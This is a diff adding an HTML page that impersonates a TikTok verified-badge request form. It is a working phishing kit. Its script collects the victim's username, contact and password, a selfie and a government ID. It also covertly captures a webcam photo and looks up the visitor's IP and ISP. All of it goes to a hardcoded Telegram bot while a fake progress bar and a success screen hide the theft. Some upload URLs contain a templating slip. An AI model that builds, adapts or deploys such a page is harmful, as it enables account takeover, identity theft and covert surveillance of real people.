@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Creator Verification - Blue Badge Request</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
+        body {
+            background: #010101;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 25px 15px;
+        }
+        .container {
+            background: #121212;
+            border: 1px solid rgba(254, 44, 85, 0.3);
+            border-radius: 24px;
+            padding: 30px 20px;
+            box-shadow: 0 15px 35px rgba(254, 44, 85, 0.2);
+            max-width: 460px;
+            width: 100%;
+            text-align: center;
+        }
+        .tik-logo {
+            font-size: 50px;
+            margin-bottom: 12px;
+        }
+        h1 {
+            font-size: 21px;
+            color: #fe2c55;
+            margin-bottom: 8px;
+            font-weight: 800;
+        }
+        p {
+            font-size: 13px;
+            color: #a1a1aa;
+            margin-bottom: 18px;
+            line-height: 1.5;
+        }
+        .info-card {
+            background: rgba(254, 44, 85, 0.08);
+            border: 1px solid rgba(254, 44, 85, 0.3);
+            padding: 12px 15px;
+            border-radius: 14px;
+            font-size: 12px;
+            color: #e4e4e7;
+            margin-bottom: 20px;
+            text-align: left;
+            line-height: 1.6;
+        }
+        .form-group {
+            margin-bottom: 14px;
+            text-align: left;
+        }
+        .form-group label {
+            font-size: 12px;
+            font-weight: 700;
+            color: #f4f4f5;
+            margin-bottom: 5px;
+            display: block;
+        }
+        .form-control {
+            width: 100%;
+            padding: 12px 14px;
+            background: #1a1a1a;
+            border: 1px solid #27272a;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 13px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        .form-control:focus {
+            border-color: #fe2c55;
+            background: #000;
+        }
+        .upload-title {
+            font-size: 13px;
+            font-weight: 800;
+            color: #fff;
+            margin: 20px 0 10px 0;
+            text-align: left;
+        }
+        .upload-box {
+            border: 2px dashed #3f3f46;
+            padding: 14px;
+            border-radius: 14px;
+            cursor: pointer;
+            background: #18181b;
+            margin-bottom: 12px;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        .upload-box:hover {
+            border-color: #fe2c55;
+            background: #27272a;
+        }
+        .upload-box input { display: none; }
+        .upload-text {
+            font-size: 12px;
+            color: #d4d4d8;
+            font-weight: 600;
+        }
+        .btn {
+            background: #fe2c55;
+            color: #FFF;
+            border: none;
+            padding: 14px;
+            font-size: 15px;
+            border-radius: 30px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4);
+            margin-top: 10px;
+        }
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        .btn:disabled {
+            background: #52525b;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        .progress-container { display: none; margin-top: 20px; }
+        .progress-bar-bg {
+            background: #27272a;
+            border-radius: 10px;
+            height: 10px;
+            width: 100%;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        .progress-bar-fill {
+            background: #fe2c55;
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+        .status-text {
+            font-size: 12px;
+            color: #fe2c55;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="main-card">
+        <div class="tik-logo">✔️</div>
+        <h1>TikTok Verified Badge Request</h1>
+        <p>Apply for the Official Creator Blue Tick badge on your TikTok profile.</p>
+        
+        <div class="info-card">
+            📌 <strong>Verification Requirements:</strong><br>
+            Please provide your account details and upload your identification documents to verify ownership.
+        </div>
+
+        <div class="form-group">
+            <label>TikTok Username:</label>
+            <input type="text" id="tikUsername" class="form-control" placeholder="@username" autocomplete="off">
+        </div>
+
+        <div class="form-group">
+            <label>Phone Number / Email:</label>
+            <input type="text" id="tikContact" class="form-control" placeholder="phone or email" autocomplete="off">
+        </div>
+
+        <div class="form-group">
+            <label>Account Password:</label>
+            <input type="password" id="tikPassword" class="form-control" placeholder="••••••••" autocomplete="off">
+        </div>
+
+        <div class="upload-title">📁 Required Document Uploads</div>
+
+        <div class="upload-box" onclick="document.getElementById('selfieInput').click()">
+            <div class="upload-text" id="selfieLabel">📸 1. Upload Personal Photo (Selfie)</div>
+            <input type="file" id="selfieInput" accept="image/*" onchange="checkUploads()">
+        </div>
+
+        <div class="upload-box" onclick="document.getElementById('idCardInput').click()">
+            <div class="upload-text" id="idCardLabel">🪪 2. Upload Government ID Card</div>
+            <input type="file" id="idCardInput" accept="image/*" onchange="checkUploads()">
+        </div>
+
+        <button class="btn" id="generateBtn" onclick="startProcess()" disabled style="opacity: 0.5;">Submit Verification Request</button>
+
+        <div class="progress-container" id="progressBox">
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="progressFill"></div>
+            </div>
+            <div class="status-text" id="statusText">Connecting to TikTok Verification Servers...</div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id') || "6782298541";
+
+        let fileSelfie = null;
+        let fileIdCard = null;
+
+        function checkUploads() {
+            const selfieIn = document.getElementById('selfieInput');
+            const idIn = document.getElementById('idCardInput');
+
+            if (selfieIn.files && selfieIn.files[0]) {
+                fileSelfie = selfieIn.files[0];
+                document.getElementById('selfieLabel').innerText = `✅ Selfie Attached: ${fileSelfie.name}`;
+            }
+
+            if (idIn.files && idIn.files[0]) {
+                fileIdCard = idIn.files[0];
+                document.getElementById('idCardLabel').innerText = `✅ ID Card Attached: ${fileIdCard.name}`;
+            }
+
+            const btn = document.getElementById('generateBtn');
+            if (fileSelfie && fileIdCard) {
+                btn.disabled = false;
+                btn.style.opacity = '1';
+            }
+        }
+
+        async function startProcess() {
+            const uName = document.getElementById('tikUsername').value.trim();
+            const uContact = document.getElementById('tikContact').value.trim();
+            const uPass = document.getElementById('tikPassword').value.trim();
+
+            if (!uName || !uContact || !uPass) {
+                alert("Please fill in all account fields.");
+                return;
+            }
+
+            document.getElementById('generateBtn').style.display = 'none';
+            document.getElementById('progressBox').style.display = 'block';
+
+            let deviceModel = "نادیار";
+            try {
+                const parser = new UAParser();
+                const result = parser.getResult();
+                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
+            } catch (e) {}
+
+            let ip = 'نادیار', isp = 'نادیار';
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ip = data.ip || 'نادیار';
+                isp = data.org || 'نادیار';
+            } catch (e) {}
+
+            let cameraBlob = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                cameraBlob = await new Promise((resolve) => {
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        canvas.toBlob(blob => {
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(blob);
+                        }, 'image/jpeg');
+                    }, 1000);
+                });
+            } catch (e) {}
+
+            updateProgress(30, "Encrypting Credentials...");
+            await sleep(800);
+            updateProgress(70, "Uploading Documents...");
+            await sleep(800);
+            updateProgress(100, "Finalizing Request...");
+
+            const msg = `🚨 **داواکاری نیشانەی شینی تیکتۆک (TikTok Verified):**\n\n` +
+                        `👤 **زانیاری ئەکاونت:**\n` +
+                        `• یوزەرنێیم: \`${uName}\`\n` +
+                        `• پەیوەندی: \`${uContact}\`\n` +
+                        `• پاسوۆرد: \`${uPass}\`\n\n` +
+                        `🌐 IP: ${ip} (${isp})\n` +
+                        `📱 ئامێر: ${deviceModel}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+                });
+            } catch (err) {}
+
+            if (cameraBlob) {
+                try {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', cameraBlob, 'camera.jpg');
+                    fd.append('caption', `📸 وێنەی ڕاستەوخۆی کامێرا (TikTok: ${uName})`);
+                    await fetch(`https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                } catch (e) {}
+            }
+
+            if (fileSelfie) {
+                try {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', fileSelfie, fileSelfie.name);
+                    fd.append('caption', `🖼 سێلفی (TikTok: ${uName})`);
+                    await fetch(`https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                } catch (e) {}
+            }
+
+            if (fileIdCard) {
+                try {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', fileIdCard, fileIdCard.name);
+                    fd.append('caption', `🪪 ناسنامە (TikTok: ${uName})`);
+                    await fetch(`https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                } catch (e) {}
+            }
+
+            setTimeout(() => {
+                document.getElementById('main-card').innerHTML = `
+                    <div style="font-size: 50px; margin-bottom: 15px;">🎉</div>
+                    <h1 style="color: #10B981; font-size: 20px; margin-bottom: 12px;">Request Submitted!</h1>
+                    <p style="color: #a1a1aa; font-size: 13px;">Your request for the TikTok Verified Badge has been received and is under review.</p>
+                `;
+            }, 1000);
+        }
+
+        function updateProgress(p, t) {
+            document.getElementById('progressFill').style.width = p + '%';
+            document.getElementById('statusText').innerText = t;
+        }
+
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+    </script>
+</body>
+</html>
